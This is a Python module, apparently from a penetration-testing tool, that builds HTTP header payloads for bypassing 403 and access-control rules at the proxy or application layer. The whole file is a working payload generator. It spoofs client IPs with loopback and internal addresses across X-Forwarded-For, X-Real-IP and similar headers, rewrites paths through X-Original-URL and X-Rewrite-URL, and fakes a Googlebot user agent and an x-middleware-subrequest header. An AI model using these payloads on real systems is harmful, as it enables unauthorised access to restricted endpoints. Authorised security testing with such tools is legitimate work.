from __future__ import annotations

from bypass.models import Payload, PayloadCategory


def _p(pid: str, label: str, name: str, value: str, **meta: object) -> tuple[dict[str, str], Payload]:
    h = {name: value}
    return h, Payload(
        id=pid,
        category=PayloadCategory.HEADER,
        label=label,
        metadata={**{"header": name, "value": value}, **meta},
    )


def default_header_sets(
    request_path: str,
    request_host: str,
    request_scheme: str = "https",
    bypass_ips: list[str] | None = None,
) -> list[tuple[dict[str, str], Payload]]:
    """
    Pares (cabeceras extra, payload) usados en bypass de 403/ACL a nivel de proxy o app.
    Valores con {path}, {host}, {scheme} se sustituyen.
    """
    path = request_path or "/"
    if not path.startswith("/"):
        path = "/" + path
    # Sin query en path (algunos WAF)
    if "?" in path:
        path = path.split("?", 1)[0]

    def fmt(s: str) -> str:
        return (
            s.replace("{path}", path)
            .replace("{host}", request_host)
            .replace("{scheme}", request_scheme)
        )

    raw: list[tuple[str, str, str, str, dict[str, object]]] = [
        ("h_x_forwarded_for", "X-Forwarded-For: loopback", "X-Forwarded-For", "127.0.0.1, 127.0.0.1", {}),
        (
            "h_x_real_ip",
            "X-Real-IP: loopback",
            "X-Real-IP",
            "127.0.0.1",
            {},
        ),
        ("h_x_originating_ip", "X-Originating-IP: loopback", "X-Originating-IP", "127.0.0.1", {}),
        ("h_true_client_ip", "True-Client-IP: loopback", "True-Client-IP", "127.0.0.1", {}),
        ("h_client_ip", "Client-IP: loopback", "Client-IP", "127.0.0.1", {}),
        ("h_x_client_ip", "X-Client-IP: loopback", "X-Client-IP", "127.0.0.1", {}),
        ("h_cf_ip", "CF-Connecting-IP: loopback", "CF-Connecting-IP", "127.0.0.1", {}),
        (
            "h_x_custom_ip",
            "X-Custom-IP-Authorization: loopback",
            "X-Custom-IP-Authorization",
            "127.0.0.1",
            {},
        ),
        (
            "h_x_custom_ip2",
            "X-Custom-IP-Authorization: base64 127.0.0.1",
            "X-Custom-IP-Authorization",
            "MTI3LjAuMC4xCg==",  # base64(127.0.0.1) style probes
            {},
        ),
        (
            "h_forwarded",
            "Forwarded: for=",
            "Forwarded",
            "for=192.0.2.1;by=192.0.2.1;host={host};proto={scheme}",
            {},
        ),
        ("h_forwarded_for", "Forwarded-For: loopback", "Forwarded-For", "127.0.0.1", {}),
        ("h_x_forwarded", "X-Forwarded: loopback", "X-Forwarded", "127.0.0.1", {}),
        ("h_x_remote_ip", "X-Remote-IP: loopback", "X-Remote-IP", "127.0.0.1", {}),
        ("h_x_remote_addr", "X-Remote-Addr: loopback", "X-Remote-Addr", "127.0.0.1", {}),
        ("h_x_proxyuser_ip", "X-ProxyUser-Ip: loopback", "X-ProxyUser-Ip", "127.0.0.1", {}),
        ("h_cluster_client_ip", "Cluster-Client-IP: loopback", "Cluster-Client-IP", "127.0.0.1", {}),
        ("h_x_forwarded_host", "X-Forwarded-Host: loopback", "X-Forwarded-Host", "127.0.0.1", {}),
        ("h_x_host", "X-Host: origen", "X-Host", "{host}", {}),
        ("h_host_localhost", "Host: localhost", "Host", "localhost", {}),
        ("h_x_forwarded_server", "X-Forwarded-Server: self", "X-Forwarded-Server", "localhost", {}),
        (
            "h_x_orig_url",
            "X-Original-URL: path (proxy)",
            "X-Original-URL",
            "{path}",
            {},
        ),
        (
            "h_x_orig_url_on_root",
            "X-Original-URL: path with request /",
            "X-Original-URL",
            "{path}",
            {"request_path_override": "/"},
        ),
        (
            "h_x_orig_url_root",
            "X-Original-URL: / (alt)",
            "X-Original-URL",
            "/",
            {},
        ),
        (
            "h_x_rewrite_url",
            "X-Rewrite-URL: path",
            "X-Rewrite-URL",
            "{path}",
            {},
        ),
        (
            "h_x_rewrite_url_on_root",
            "X-Rewrite-URL: path with request /",
            "X-Rewrite-URL",
            "{path}",
            {"request_path_override": "/"},
        ),
        (
            "h_x_override_url",
            "X-Override-URL: path",
            "X-Override-URL",
            "{path}",
            {},
        ),
        (
            "h_referer_samehost",
            "Referer: same host",
            "Referer",
            "{scheme}://{host}{path}",
            {},
        ),
        (
            "h_x_forwarded_proto_https",
            "X-Forwarded-Proto: https",
            "X-Forwarded-Proto",
            "https",
            {},
        ),
        (
            "h_x_forwarded_proto_http",
            "X-Forwarded-Proto: http",
            "X-Forwarded-Proto",
            "http",
            {},
        ),
        (
            "h_x_forwarded_port_443",
            "X-Forwarded-Port: 443",
            "X-Forwarded-Port",
            "443",
            {},
        ),
        ("h_x_forwarded_port_80", "X-Forwarded-Port: 80", "X-Forwarded-Port", "80", {}),
        ("h_x_port_443", "X-Port: 443", "X-Port", "443", {}),
        ("h_x_port_80", "X-Port: 80", "X-Port", "80", {}),
        ("h_origin_samehost", "Origin: same host", "Origin", "{scheme}://{host}", {}),
        ("h_user_agent_googlebot", "User-Agent: Googlebot", "User-Agent", "Googlebot/2.1", {}),
        (
            "h_x_appengine_trusted",
            "X-AppEngine-Trusted-IP-Request: 1",
            "X-AppEngine-Trusted-IP-Request",
            "1",
            {},
        ),
        ("h_x_forwarded_scheme_https", "X-Forwarded-Scheme: https", "X-Forwarded-Scheme", "https", {}),
        ("h_x_original_method_get", "X-Original-Method: GET", "X-Original-Method", "GET", {}),
        (
            "h_x_middleware_subrequest",
            "x-middleware-subrequest",
            "x-middleware-subrequest",
            "middleware",
            {},
        ),
        (
            "h_destination",
            "Destination: same path",
            "Destination",
            "{scheme}://{host}{path}",
            {},
        ),
    ]
    ip_pool: list[str] = ["127.0.0.1", "::1", "10.0.0.1", "192.168.0.1"]
    for ip in (bypass_ips or []):
        ip2 = ip.strip()
        if ip2 and ip2 not in ip_pool:
            ip_pool.append(ip2)
    ip_pool = ip_pool[:16]

    for idx, ip in enumerate(ip_pool, start=1):
        raw.extend(
            [
                (
                    f"h_xff_pool_{idx}",
                    f"X-Forwarded-For: {ip}",
                    "X-Forwarded-For",
                    ip,
                    {"ip_pool": True},
                ),
                (
                    f"h_xff_chain_{idx}",
                    f"X-Forwarded-For chained: {ip}",
                    "X-Forwarded-For",
                    f"{ip}, {ip}, {ip}",
                    {"ip_pool": True, "chain": True},
                ),
                (
                    f"h_x_real_pool_{idx}",
                    f"X-Real-IP: {ip}",
                    "X-Real-IP",
                    ip,
                    {"ip_pool": True},
                ),
            ]
        )

    out: list[tuple[dict[str, str], Payload]] = []
    for pid, label, k, v, meta in raw:
        val = fmt(v)
        d, p = _p(pid, label, k, val, **meta)
        out.append((d, p))
    return out
